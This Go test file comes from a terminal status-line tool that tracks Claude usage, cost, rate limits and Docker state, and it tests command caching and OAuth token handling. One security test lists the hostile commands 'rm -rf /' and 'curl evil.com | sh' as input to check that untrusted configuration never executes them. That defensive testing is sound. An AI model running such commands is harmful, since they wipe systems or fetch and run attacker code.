package datasource

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/jamesprnich/oh-my-line/engine/internal/cache"
	"github.com/jamesprnich/oh-my-line/engine/internal/render"
)

// ── ETA helpers ──

func TestEtaMins(t *testing.T) {
	tests := []struct {
		cur, ref float64
		elapsed  int
		want     int
	}{
		// 50% used in 300s, 50% remaining => 300s => 5min
		{50, 0, 300, 5},
		// No progress
		{50, 50, 300, -1},
		// Negative progress
		{40, 50, 300, -1},
		// 100% used
		{100, 0, 600, 0},
		// Zero elapsed
		{50, 0, 0, -1},
	}
	for _, tt := range tests {
		got := etaMins(tt.cur, tt.ref, tt.elapsed)
		if got != tt.want {
			t.Errorf("etaMins(%.1f, %.1f, %d) = %d, want %d", tt.cur, tt.ref, tt.elapsed, got, tt.want)
		}
	}
}

func TestRenderETASegment(t *testing.T) {
	eta := &ETAResult{
		Session:    "~2h 30m",
		SessionMin: "~1h 45m",
		Weekly:     "~5d 3h",
	}

	got := RenderETASegment("eta-session", eta, "5h", "7d")
	if !strings.Contains(got, "5h") || !strings.Contains(got, "~2h 30m") {
		t.Errorf("eta-session = %q", got)
	}

	got = RenderETASegment("eta-session-min", eta, "5h", "7d")
	if !strings.Contains(got, "5h/min") || !strings.Contains(got, "~1h 45m") {
		t.Errorf("eta-session-min = %q", got)
	}

	got = RenderETASegment("eta-weekly", eta, "5h", "7d")
	if !strings.Contains(got, "7d") || !strings.Contains(got, "~5d 3h") {
		t.Errorf("eta-weekly = %q", got)
	}
}

func TestRenderETASegment_NoData(t *testing.T) {
	eta := &ETAResult{}
	got := RenderETASegment("eta-session", eta, "5h", "7d")
	if !strings.Contains(got, "—") {
		t.Errorf("eta-session with no data should show dash, got %q", got)
	}
}

// ── Burn rate ──

func TestRenderBurnSegment(t *testing.T) {
	burn := &BurnResult{
		RateMin: 5000,
		RateHr:  300000,
		Elapsed: 120,
		HasData: true,
	}

	got := RenderBurnSegment("burn-min", burn, 30)
	if !strings.Contains(got, "5k/min") {
		t.Errorf("burn-min = %q, want 5k/min", got)
	}

	got = RenderBurnSegment("burn-hr", burn, 30)
	if !strings.Contains(got, "300k/hr") {
		t.Errorf("burn-hr = %q, want 300k/hr", got)
	}
}

func TestRenderBurnSegment_Warmup(t *testing.T) {
	burn := &BurnResult{
		RateMin: 5000,
		Elapsed: 10, // below warmup
		HasData: true,
	}

	got := RenderBurnSegment("burn-min", burn, 30)
	if !strings.Contains(got, "—/min") {
		t.Errorf("burn-min during warmup should show dash, got %q", got)
	}
}

func TestRenderBurnSegment_NoData(t *testing.T) {
	burn := &BurnResult{}
	got := RenderBurnSegment("burn-min", burn, 30)
	if !strings.Contains(got, "—/min") {
		t.Errorf("burn-min with no data should show dash, got %q", got)
	}
}

// ── Cost rendering ──

func TestFormatDollars(t *testing.T) {
	tests := []struct {
		cents float64
		want  string
	}{
		{0.5, "$0.00"},
		{1.0, "$0.01"},
		{150, "$1.50"},
		{9999, "$99.99"},
		{10000, "$100"},
		{100000, "$1000"},
	}
	for _, tt := range tests {
		got := formatDollars(tt.cents)
		if got != tt.want {
			t.Errorf("formatDollars(%.1f) = %q, want %q", tt.cents, got, tt.want)
		}
	}
}

func TestRenderCostSegment(t *testing.T) {
	cost := &CostResult{
		CtxFmt:  "$1.50",
		MinFmt:  "$0.05",
		HrFmt:   "$3.00",
		Day7Fmt: "$25.00",
	}

	got := RenderCostSegment("cost", cost)
	if !strings.Contains(got, "~$1.50") {
		t.Errorf("cost = %q", got)
	}

	got = RenderCostSegment("cost-min", cost)
	if !strings.Contains(got, "~$0.05/min") {
		t.Errorf("cost-min = %q", got)
	}

	got = RenderCostSegment("cost-hr", cost)
	if !strings.Contains(got, "~$3.00/hr") {
		t.Errorf("cost-hr = %q", got)
	}

	got = RenderCostSegment("cost-7d", cost)
	if !strings.Contains(got, "~$25.00 (7d)") {
		t.Errorf("cost-7d = %q", got)
	}
}

func TestRenderCostSegment_NoData(t *testing.T) {
	cost := &CostResult{}
	got := RenderCostSegment("cost", cost)
	if got != "" {
		t.Errorf("cost with no data should be empty, got %q", got)
	}

	got = RenderCostSegment("cost-min", cost)
	if !strings.Contains(got, "—") {
		t.Errorf("cost-min with no data should show dash, got %q", got)
	}
}

// ── Rate limit rendering ──

func TestSecsToLabel(t *testing.T) {
	tests := []struct {
		secs int
		want string
	}{
		{3600, "1h"},
		{7200, "2h"},
		{18000, "5h"},
		{86400, "1d"},
		{604800, "7d"},
		{5400, "2h"},  // rounds
	}
	for _, tt := range tests {
		got := secsToLabel(tt.secs)
		if got != tt.want {
			t.Errorf("secsToLabel(%d) = %q, want %q", tt.secs, got, tt.want)
		}
	}
}

func TestIsoToEpoch(t *testing.T) {
	tests := []struct {
		iso  string
		want bool // just check non-zero
	}{
		{"2025-06-15T10:00:00Z", true},
		{"2025-06-15T10:00:00+00:00", true},
		{"", false},
		{"null", false},
		{"not-a-date", false},
	}
	for _, tt := range tests {
		got := isoToEpoch(tt.iso)
		if (got != 0) != tt.want {
			t.Errorf("isoToEpoch(%q) = %d, wantNonZero=%v", tt.iso, got, tt.want)
		}
	}
}

func TestRenderRateLimitSegment_NoData(t *testing.T) {
	rl := &RateLimitResult{ShortLabel: "5h", LongLabel: "7d"}
	got := RenderRateLimitSegment("rate-session", rl, "", true)
	if !strings.Contains(got, "5h") || !strings.Contains(got, "—") {
		t.Errorf("rate-session no data = %q", got)
	}
}

func TestRenderRateLimitSegment_Normal(t *testing.T) {
	rl := &RateLimitResult{
		HasData:    true,
		SessionPct: 45,
		SessionPctRaw: 45.2,
		ShortLabel: "5h",
		LongLabel:  "7d",
	}
	got := RenderRateLimitSegment("rate-session", rl, "", true)
	if !strings.Contains(got, "5h") || !strings.Contains(got, "45%") {
		t.Errorf("rate-session normal = %q", got)
	}
}

func TestRenderRateLimitSegment_ZoomBar(t *testing.T) {
	rl := &RateLimitResult{
		HasData:       true,
		SessionPct:    98,
		SessionPctRaw: 98.5,
		ShortLabel:    "5h",
		LongLabel:     "7d",
	}
	got := RenderRateLimitSegment("rate-session", rl, "", true)
	// Should show zoom bar with "left" text
	if !strings.Contains(got, "left") {
		t.Errorf("rate-session >=95%% should show zoom bar, got %q", got)
	}
}

func TestRenderRateLimitSegment_Extra(t *testing.T) {
	rl := &RateLimitResult{
		HasData:      true,
		ExtraEnabled: true,
		ExtraPct:     30,
		ExtraUsed:    15.50,
		ExtraLimit:   50.00,
		ShortLabel:   "5h",
		LongLabel:    "7d",
	}
	got := RenderRateLimitSegment("rate-extra", rl, "", false)
	if !strings.Contains(got, "extra") || !strings.Contains(got, "$15.50/$50.00") {
		t.Errorf("rate-extra = %q", got)
	}
}

func TestRenderRateLimitSegment_ExtraDisabled(t *testing.T) {
	rl := &RateLimitResult{HasData: true, ShortLabel: "5h", LongLabel: "7d"}
	got := RenderRateLimitSegment("rate-extra", rl, "", false)
	if got != "" {
		t.Errorf("rate-extra disabled should be empty, got %q", got)
	}
}

func TestRenderRateLimitSegment_Opus(t *testing.T) {
	rl := &RateLimitResult{
		HasData:    true,
		OpusPct:    60,
		OpusPctRaw: 60.0,
		ShortLabel: "5h",
		LongLabel:  "7d",
	}
	got := RenderRateLimitSegment("rate-opus", rl, "", true)
	if !strings.Contains(got, "opus") || !strings.Contains(got, "60%") {
		t.Errorf("rate-opus = %q", got)
	}
}

func TestRenderRateLimitSegment_OpusZero(t *testing.T) {
	rl := &RateLimitResult{HasData: true, ShortLabel: "5h", LongLabel: "7d"}
	got := RenderRateLimitSegment("rate-opus", rl, "", true)
	if got != "" {
		t.Errorf("rate-opus 0%% should be empty, got %q", got)
	}
}

func TestRenderRateLimitSegment_Stale(t *testing.T) {
	rl := &RateLimitResult{
		HasData:    true,
		SessionPct: 45,
		ShortLabel: "5h",
		LongLabel:  "7d",
		Stale:      true,
	}
	got := RenderRateLimitSegment("rate-session", rl, "", true)
	// Yellow ⚠ = \033[38;2;230;200;0m i.e. #e6c800
	if !strings.Contains(got, "⚠") {
		t.Errorf("stale should contain ⚠, got %q", got)
	}
	if !strings.Contains(got, "\033[38;2;230;200;0m") {
		t.Errorf("stale ⚠ should be yellow (#e6c800), got %q", got)
	}
}

func TestRenderRateLimitSegment_Unreachable(t *testing.T) {
	rl := &RateLimitResult{
		HasData:     true,
		SessionPct:  45,
		ShortLabel:  "5h",
		LongLabel:   "7d",
		Unreachable: true,
	}
	got := RenderRateLimitSegment("rate-session", rl, "", true)
	// Red ⚠ = \033[38;2;255;85;85m i.e. #ff5555
	if !strings.Contains(got, "⚠") {
		t.Errorf("unreachable should contain ⚠, got %q", got)
	}
	if !strings.Contains(got, "\033[38;2;255;85;85m") {
		t.Errorf("unreachable ⚠ should be red (#ff5555), got %q", got)
	}
}

func TestRenderRateLimitSegment_UnreachableNoData(t *testing.T) {
	rl := &RateLimitResult{
		HasData:     false,
		ShortLabel:  "5h",
		LongLabel:   "7d",
		Unreachable: true,
	}
	got := RenderRateLimitSegment("rate-session", rl, "", true)
	if !strings.Contains(got, "⚠") {
		t.Errorf("unreachable with no data should still contain ⚠, got %q", got)
	}
}

func TestRenderRateLimitSegment_BlockStyle(t *testing.T) {
	rl := &RateLimitResult{
		HasData:    true,
		SessionPct: 45,
		ShortLabel: "5h",
		LongLabel:  "7d",
	}
	got := RenderRateLimitSegment("rate-session", rl, "block", true)
	if !strings.Contains(got, "▓") && !strings.Contains(got, "░") {
		t.Errorf("rate-session block style should contain ▓ or ░, got %q", got)
	}
}

func TestRenderRateLimitSegment_BlockStyleWeekly(t *testing.T) {
	rl := &RateLimitResult{
		HasData:    true,
		WeeklyPct:  30,
		ShortLabel: "5h",
		LongLabel:  "7d",
	}
	got := RenderRateLimitSegment("rate-weekly", rl, "block", false)
	if !strings.Contains(got, "▓") && !strings.Contains(got, "░") {
		t.Errorf("rate-weekly block style should contain ▓ or ░, got %q", got)
	}
}

// ── Sparkline helpers ──

func TestParseCSV(t *testing.T) {
	vals := parseCSV("1,2,3,4,5,6,7,8")
	if len(vals) != 8 {
		t.Fatalf("parseCSV should return 8 vals, got %d", len(vals))
	}
	if vals[0] != 1 || vals[7] != 8 {
		t.Errorf("vals = %v", vals)
	}
}

func TestParseCSV_Pad(t *testing.T) {
	vals := parseCSV("1,2,3")
	if len(vals) != 8 {
		t.Fatalf("parseCSV should pad to 8, got %d", len(vals))
	}
	// Should be [0,0,0,0,0,1,2,3]
	if vals[7] != 3 || vals[0] != 0 {
		t.Errorf("vals = %v", vals)
	}
}

func TestFilledCount(t *testing.T) {
	if filledCount([]int{0, 0, 5, 10, 0, 3, 0, 8}) != 4 {
		t.Error("filledCount wrong")
	}
	if filledCount([]int{0, 0, 0, 0, 0, 0, 0, 0}) != 0 {
		t.Error("filledCount should be 0 for all zeros")
	}
}

func TestMinMax(t *testing.T) {
	vals := []int{0, 0, 5, 10, 3, 8, 2, 7}
	min, max := minMax(vals, 2)
	if min != 2 || max != 10 {
		t.Errorf("minMax = (%d, %d), want (2, 10)", min, max)
	}
}

func TestUpdateBucket_NewState(t *testing.T) {
	state := &sparkState{vals: make([]int, 8)}
	result := updateBucket(state, 120, 50, 1000)
	if result.vals[7] != 50 {
		t.Errorf("last bucket should be 50, got %d", result.vals[7])
	}
}

func TestUpdateBucket_Shift(t *testing.T) {
	state := &sparkState{
		epoch: 1000,
		vals:  []int{1, 2, 3, 4, 5, 6, 7, 8},
	}
	// 240s elapsed with 120s bucket = 2 shifts
	result := updateBucket(state, 120, 99, 1240)
	if result.vals[7] != 99 {
		t.Errorf("last bucket after shift should be 99, got %d", result.vals[7])
	}
	// First 2 should have shifted out
	if result.vals[0] != 3 || result.vals[1] != 4 {
		t.Errorf("shifted vals = %v", result.vals)
	}
}

func TestRenderSpark(t *testing.T) {
	vals := []int{0, 0, 10, 20, 30, 40, 50, 60}
	got := renderSpark(vals, 6)
	if len([]rune(got)) != 8 {
		t.Errorf("spark should have 8 chars, got %d: %q", len([]rune(got)), got)
	}
	// First 2 should be dots
	runes := []rune(got)
	if runes[0] != '·' || runes[1] != '·' {
		t.Errorf("unfilled positions should be dots, got %q", got)
	}
}

func TestRenderCostSpark(t *testing.T) {
	vals := []int{0, 100, 200, 0, 300, 150, 50}
	got := renderCostSpark(vals)
	if len([]rune(got)) != 7 {
		t.Errorf("cost spark should have 7 chars, got %d: %q", len([]rune(got)), got)
	}
	// First char should be dot (value 0)
	runes := []rune(got)
	if runes[0] != '·' {
		t.Errorf("zero value should be dot, got %c", runes[0])
	}
}

func TestRenderCostSpark_AllZero(t *testing.T) {
	vals := []int{0, 0, 0, 0, 0, 0, 0}
	got := renderCostSpark(vals)
	for _, r := range got {
		if r != '·' {
			t.Errorf("all zero should be all dots, got %q", got)
			break
		}
	}
}

// ── Docker parsing ──

func TestParseDockerData(t *testing.T) {
	data := `[
		{"Service":"web","Name":"web-1","State":"running","Health":"","Image":"node:20"},
		{"Service":"postgres","Name":"db-1","State":"running","Health":"healthy","Image":"postgres:16"},
		{"Service":"redis","Name":"redis-1","State":"running","Health":"","Image":"redis:7"}
	]`

	result := &DockerResult{}
	types := map[string]bool{"docker": true, "docker-db": true}
	parseDockerData(data, result, types)

	if !strings.Contains(result.Summary, "3/3 up") {
		t.Errorf("docker summary = %q, want 3/3 up", result.Summary)
	}
	if !strings.Contains(result.DB, "pg") || !strings.Contains(result.DB, "up") {
		t.Errorf("docker-db = %q, want pg: up", result.DB)
	}
}

func TestParseDockerData_Unhealthy(t *testing.T) {
	data := `[
		{"Service":"web","State":"running","Health":"unhealthy","Image":"node:20"},
		{"Service":"db","State":"running","Health":"","Image":"postgres:16"}
	]`

	result := &DockerResult{}
	types := map[string]bool{"docker": true}
	parseDockerData(data, result, types)

	if !strings.Contains(result.Summary, "1 unhealthy") {
		t.Errorf("docker summary = %q, want unhealthy", result.Summary)
	}
}

func TestParseDockerData_Partial(t *testing.T) {
	data := `[
		{"Service":"web","State":"running","Health":"","Image":"node:20"},
		{"Service":"db","State":"exited","Health":"","Image":"postgres:16"}
	]`

	result := &DockerResult{}
	types := map[string]bool{"docker": true, "docker-db": true}
	parseDockerData(data, result, types)

	if !strings.Contains(result.Summary, "1/2 up") {
		t.Errorf("docker summary = %q, want 1/2 up", result.Summary)
	}
	if !strings.Contains(result.DB, "down") {
		t.Errorf("docker-db = %q, want down", result.DB)
	}
}

func TestParseDockerData_DBDetection(t *testing.T) {
	tests := []struct {
		service string
		image   string
		want    string
	}{
		{"postgres", "postgres:16", "pg"},
		{"mysql", "mysql:8", "mysql"},
		{"my-redis", "redis:7", "redis"},
		{"db", "custom-image", "db"},
		{"database", "custom-image", "database"},
		{"mongo-primary", "mongo:7", "mongo"},
	}
	for _, tt := range tests {
		data := `[{"Service":"` + tt.service + `","State":"running","Health":"","Image":"` + tt.image + `"}]`
		result := &DockerResult{}
		types := map[string]bool{"docker-db": true}
		parseDockerData(data, result, types)
		if result.DB == "" {
			t.Errorf("docker-db should detect %s/%s as DB", tt.service, tt.image)
		}
	}
}

func TestParseDockerData_InvalidJSON(t *testing.T) {
	result := &DockerResult{}
	types := map[string]bool{"docker": true}
	parseDockerData("not json", result, types)
	if result.Summary != "" {
		t.Errorf("invalid JSON should produce empty result, got %q", result.Summary)
	}
}

func TestParseDockerData_Empty(t *testing.T) {
	result := &DockerResult{}
	types := map[string]bool{"docker": true}
	parseDockerData("[]", result, types)
	if !strings.Contains(result.Summary, "no containers") {
		t.Errorf("empty list should show 'no containers', got %q", result.Summary)
	}
}

// ── Pricing models ──

func TestPricingModels(t *testing.T) {
	if _, ok := pricingModels["opus"]; !ok {
		t.Error("opus pricing missing")
	}
	if _, ok := pricingModels["sonnet"]; !ok {
		t.Error("sonnet pricing missing")
	}
	if _, ok := pricingModels["haiku"]; !ok {
		t.Error("haiku pricing missing")
	}
	// Opus should be most expensive
	if pricingModels["opus"].input <= pricingModels["sonnet"].input {
		t.Error("opus should be more expensive than sonnet")
	}
	if pricingModels["sonnet"].input <= pricingModels["haiku"].input {
		t.Error("sonnet should be more expensive than haiku")
	}
}

// ── ExecCommand (real shell execution + caching) ────────────────────────────

func TestExecCommand_BasicExecution(t *testing.T) {
	result := ExecCommand("echo test-exec", 1, 3)
	if result != "test-exec" {
		t.Errorf("ExecCommand = %q, want test-exec", result)
	}
}

func TestExecCommand_EmptyCommand(t *testing.T) {
	result := ExecCommand("", 60, 3)
	if result != "" {
		t.Errorf("empty command should return empty, got %q", result)
	}
}

func TestExecCommand_FailedCommandReturnsEmpty(t *testing.T) {
	result := ExecCommand("false", 1, 3)
	if result != "" {
		t.Errorf("failed command should return empty, got %q", result)
	}
}

func TestExecCommand_OutputTrimmed(t *testing.T) {
	result := ExecCommand("printf '  hello  \n\n'", 1, 3)
	if result != "hello" {
		t.Errorf("output not trimmed: %q", result)
	}
}

func TestExecCommand_TimeoutClampsAt30(t *testing.T) {
	// Timeout > 30 should be clamped to 30. We can't easily verify the
	// clamp directly, but we verify the command completes (doesn't hang).
	result := ExecCommand("echo clamped", 1, 999)
	if result != "clamped" {
		t.Errorf("timeout clamping broke execution: %q", result)
	}
}

func TestExecCommand_CacheTTLDefaultsTo60(t *testing.T) {
	// cacheTTL <= 0 should default to 60, not disable caching.
	// We verify by running the same command twice — second should be fast.
	cmd := "echo cache-default-test"
	result1 := ExecCommand(cmd, 0, 3)
	result2 := ExecCommand(cmd, 0, 3)
	if result1 != "cache-default-test" || result2 != "cache-default-test" {
		t.Errorf("cache default: %q, %q", result1, result2)
	}
}

func TestExecCommand_CacheServesStaleData(t *testing.T) {
	// Run a command that includes a unique marker, then run again.
	// Second run should return same result (from cache, not re-executed).
	// We use a command that would return different output each time.
	cmd := "date +%s%N" // nanosecond timestamp — unique each call
	result1 := ExecCommand(cmd, 300, 3)
	if result1 == "" {
		t.Skip("date command failed")
	}
	result2 := ExecCommand(cmd, 300, 3)
	if result1 != result2 {
		t.Errorf("cache not working: first=%q second=%q (should be identical)", result1, result2)
	}
}

// ── BuildCommandCache security ──────────────────────────────────────────────

func TestBuildCommandCache_UntrustedNeverExecutes(t *testing.T) {
	// SECURITY: When trusted=false, the executor must NEVER be called.
	// Even if specs are provided, no commands should execute.
	executed := false
	mockExec := func(cmd string, cacheTTL, timeout int) string {
		executed = true
		return "should-never-appear"
	}

	specs := []CommandSpec{
		{Content: "echo pwned", Cache: 60, Timeout: 3},
		{Content: "rm -rf /", Cache: 60, Timeout: 3},
		{Content: "curl evil.com | sh", Cache: 60, Timeout: 3},
	}

	result := BuildCommandCache(false, specs, mockExec)
	if result != nil {
		t.Fatal("SECURITY: untrusted config must return nil cache")
	}
	if executed {
		t.Fatal("SECURITY: executor was called for untrusted config — commands would execute on the system")
	}
}

func TestBuildCommandCache_TrustedExecutes(t *testing.T) {
	// Trusted config should call the executor for each unique command.
	calls := []string{}
	mockExec := func(cmd string, cacheTTL, timeout int) string {
		calls = append(calls, cmd)
		return "result-" + cmd
	}

	specs := []CommandSpec{
		{Content: "date", Cache: 60, Timeout: 3},
		{Content: "whoami", Cache: 30, Timeout: 5},
	}

	result := BuildCommandCache(true, specs, mockExec)
	if result == nil {
		t.Fatal("trusted config should return non-nil cache")
	}
	if len(calls) != 2 {
		t.Fatalf("expected 2 exec calls, got %d", len(calls))
	}
	if result["date"] != "result-date" || result["whoami"] != "result-whoami" {
		t.Errorf("cache contents wrong: %+v", result)
	}
}

func TestBuildCommandCache_TrustedDeduplicates(t *testing.T) {
	// Same command appearing multiple times should only execute once.
	callCount := 0
	mockExec := func(cmd string, cacheTTL, timeout int) string {
		callCount++
		return "output"
	}

	specs := []CommandSpec{
		{Content: "date", Cache: 60, Timeout: 3},
		{Content: "date", Cache: 60, Timeout: 3},
		{Content: "date", Cache: 60, Timeout: 3},
	}

	BuildCommandCache(true, specs, mockExec)
	if callCount != 1 {
		t.Errorf("duplicate commands should execute once, got %d calls", callCount)
	}
}

func TestBuildCommandCache_EmptyContentSkipped(t *testing.T) {
	// Specs with empty content should be skipped.
	calls := []string{}
	mockExec := func(cmd string, cacheTTL, timeout int) string {
		calls = append(calls, cmd)
		return "output"
	}

	specs := []CommandSpec{
		{Content: "", Cache: 60, Timeout: 3},
		{Content: "real-cmd", Cache: 60, Timeout: 3},
		{Content: "", Cache: 60, Timeout: 3},
	}

	result := BuildCommandCache(true, specs, mockExec)
	if len(calls) != 1 || calls[0] != "real-cmd" {
		t.Errorf("should only execute non-empty commands, calls=%v", calls)
	}
	if result["real-cmd"] != "output" {
		t.Errorf("cache wrong: %+v", result)
	}
}

func TestBuildCommandCache_NoSpecsReturnsNil(t *testing.T) {
	// Even if trusted, no specs means no cache needed.
	executed := false
	mockExec := func(cmd string, cacheTTL, timeout int) string {
		executed = true
		return ""
	}

	result := BuildCommandCache(true, nil, mockExec)
	if result != nil {
		t.Error("nil specs should return nil cache")
	}
	if executed {
		t.Error("should not call executor with no specs")
	}

	result = BuildCommandCache(true, []CommandSpec{}, mockExec)
	if result != nil {
		t.Error("empty specs should return nil cache")
	}
}

// ── OAuth with configDir ──

func TestGetOAuthToken_ReadsFromConfigDir(t *testing.T) {
	dir := t.TempDir()
	cred := credentialFile{}
	cred.ClaudeAiOauth.AccessToken = "test-token-123"
	data, _ := json.Marshal(cred)
	os.WriteFile(filepath.Join(dir, ".credentials.json"), data, 0600)

	// Clear env var so it doesn't take precedence
	t.Setenv("CLAUDE_CODE_OAUTH_TOKEN", "")

	got := GetOAuthToken(dir)
	if got != "test-token-123" {
		t.Errorf("GetOAuthToken(%q) = %q, want test-token-123", dir, got)
	}
}

func TestGetOAuthToken_InsecurePermsSkipped(t *testing.T) {
	dir := t.TempDir()
	cred := credentialFile{}
	cred.ClaudeAiOauth.AccessToken = "insecure-token"
	data, _ := json.Marshal(cred)
	// Write with insecure 0644 permissions
	os.WriteFile(filepath.Join(dir, ".credentials.json"), data, 0644)

	t.Setenv("CLAUDE_CODE_OAUTH_TOKEN", "")

	got := GetOAuthToken(dir)
	if got == "insecure-token" {
		t.Error("GetOAuthToken should skip credentials with insecure permissions")
	}
}

func TestGetOAuthToken_DifferentConfigDirsGetDifferentTokens(t *testing.T) {
	dir1 := t.TempDir()
	dir2 := t.TempDir()

	cred1 := credentialFile{}
	cred1.ClaudeAiOauth.AccessToken = "token-account-1"
	data1, _ := json.Marshal(cred1)
	os.WriteFile(filepath.Join(dir1, ".credentials.json"), data1, 0600)

	cred2 := credentialFile{}
	cred2.ClaudeAiOauth.AccessToken = "token-account-2"
	data2, _ := json.Marshal(cred2)
	os.WriteFile(filepath.Join(dir2, ".credentials.json"), data2, 0600)

	t.Setenv("CLAUDE_CODE_OAUTH_TOKEN", "")

	got1 := GetOAuthToken(dir1)
	got2 := GetOAuthToken(dir2)
	if got1 != "token-account-1" {
		t.Errorf("dir1 token = %q, want token-account-1", got1)
	}
	if got2 != "token-account-2" {
		t.Errorf("dir2 token = %q, want token-account-2", got2)
	}
	if got1 == got2 {
		t.Error("different config dirs should return different tokens")
	}
}

// ── Multi-account isolation ──

func TestMultiAccount_BurnRateIsolation(t *testing.T) {
	key1 := cache.AccountKey("/fake/account-1")
	key2 := cache.AccountKey("/fake/account-2")

	dir1, err := cache.AccountDir(key1)
	if err != nil {
		t.Fatalf("AccountDir(%q): %v", key1, err)
	}
	dir2, err := cache.AccountDir(key2)
	if err != nil {
		t.Fatalf("AccountDir(%q): %v", key2, err)
	}

	// Write different burn state to each account
	cache.WriteBurnFile(dir1, 1000, 50000)
	cache.WriteBurnFile(dir2, 1000, 80000)

	state1, _ := cache.ReadBurnFile(dir1)
	state2, _ := cache.ReadBurnFile(dir2)

	if state1.StartTokens == state2.StartTokens {
		t.Errorf("burn files should be isolated: both have %d tokens", state1.StartTokens)
	}
	if state1.StartTokens != 50000 {
		t.Errorf("account1 tokens = %d, want 50000", state1.StartTokens)
	}
	if state2.StartTokens != 80000 {
		t.Errorf("account2 tokens = %d, want 80000", state2.StartTokens)
	}
}

func TestMultiAccount_CostIsolation(t *testing.T) {
	key1 := cache.AccountKey("/fake/cost-acct-1")
	key2 := cache.AccountKey("/fake/cost-acct-2")

	// Verify the account dirs are different
	dir1, _ := cache.AccountDir(key1)
	dir2, _ := cache.AccountDir(key2)
	if dir1 == dir2 {
		t.Fatalf("account dirs should differ: both %q", dir1)
	}

	// Verify baseline files would be isolated
	base1 := filepath.Join(dir1, "statusline-cost-base.dat")
	base2 := filepath.Join(dir2, "statusline-cost-base.dat")
	if base1 == base2 {
		t.Error("cost baseline paths should differ between accounts")
	}
}

func TestMultiAccount_SparklineIsolation(t *testing.T) {
	key1 := cache.AccountKey("/fake/spark-acct-1")
	key2 := cache.AccountKey("/fake/spark-acct-2")

	dir1, _ := cache.AccountDir(key1)
	dir2, _ := cache.AccountDir(key2)

	spark1 := filepath.Join(dir1, "statusline-spark.dat")
	spark2 := filepath.Join(dir2, "statusline-spark.dat")
	if spark1 == spark2 {
		t.Error("sparkline paths should differ between accounts")
	}
}

func TestMultiAccount_DefaultAccountBackwardCompat(t *testing.T) {
	baseDir, err := cache.Dir()
	if err != nil {
		t.Fatalf("Dir(): %v", err)
	}

	// "default" account should use the base directory (no subdirectory)
	defaultDir, err := cache.AccountDir("default")
	if err != nil {
		t.Fatalf("AccountDir(default): %v", err)
	}
	if defaultDir != baseDir {
		t.Errorf("default account dir = %q, want base dir %q", defaultDir, baseDir)
	}

	// Write a burn file to the default location and verify it's readable
	cache.WriteBurnFile(baseDir, 999, 12345)
	state, err := cache.ReadBurnFile(defaultDir)
	if err != nil {
		t.Fatalf("ReadBurnFile from default dir: %v", err)
	}
	if state.StartTokens != 12345 {
		t.Errorf("tokens = %d, want 12345", state.StartTokens)
	}
}

func TestMultiAccount_RateLimitCacheIsolation(t *testing.T) {
	key1 := cache.AccountKey("/fake/rate-acct-1")
	key2 := cache.AccountKey("/fake/rate-acct-2")

	dir1, _ := cache.AccountDir(key1)
	dir2, _ := cache.AccountDir(key2)

	// Verify usage cache files would be different
	cache1 := filepath.Join(dir1, "statusline-usage-cache.json")
	cache2 := filepath.Join(dir2, "statusline-usage-cache.json")
	if cache1 == cache2 {
		t.Error("usage cache paths should differ between accounts")
	}
}

// ── Security: multi-account ──

func TestMultiAccount_CurlCfgIsolated(t *testing.T) {
	key := cache.AccountKey("/fake/curl-acct")
	dir, _ := cache.AccountDir(key)

	cfgPath := filepath.Join(dir, "statusline-curl-cfg.tmp")
	baseDir, _ := cache.Dir()
	baseCfgPath := filepath.Join(baseDir, "statusline-curl-cfg.tmp")

	if cfgPath == baseCfgPath {
		t.Error("curl config for non-default account should not be in base dir")
	}
	if !strings.Contains(cfgPath, "acct-") {
		t.Errorf("curl config path should contain acct- prefix: %q", cfgPath)
	}
}

func TestMultiAccount_AccountDirPermissions(t *testing.T) {
	key := cache.AccountKey("/fake/perm-test-acct")
	dir, err := cache.AccountDir(key)
	if err != nil {
		t.Fatalf("AccountDir: %v", err)
	}

	fi, err := os.Stat(dir)
	if err != nil {
		t.Fatalf("Stat(%q): %v", dir, err)
	}
	if fi.Mode().Perm() != 0700 {
		t.Errorf("account dir perms = %o, want 0700", fi.Mode().Perm())
	}
}

func TestMultiAccount_AccountKeyNotReversible(t *testing.T) {
	path := "/home/secret-user/.claude-work"
	key := cache.AccountKey(path)

	// The key should not contain the original path
	if strings.Contains(key, "secret") || strings.Contains(key, "claude-work") {
		t.Errorf("account key %q should not expose original path %q", key, path)
	}
	// Should be a hex hash, not the path itself
	if len(key) != 8 {
		t.Errorf("account key should be 8 hex chars, got %q (len %d)", key, len(key))
	}
}

// Suppress unused import warnings
var _ = render.RST
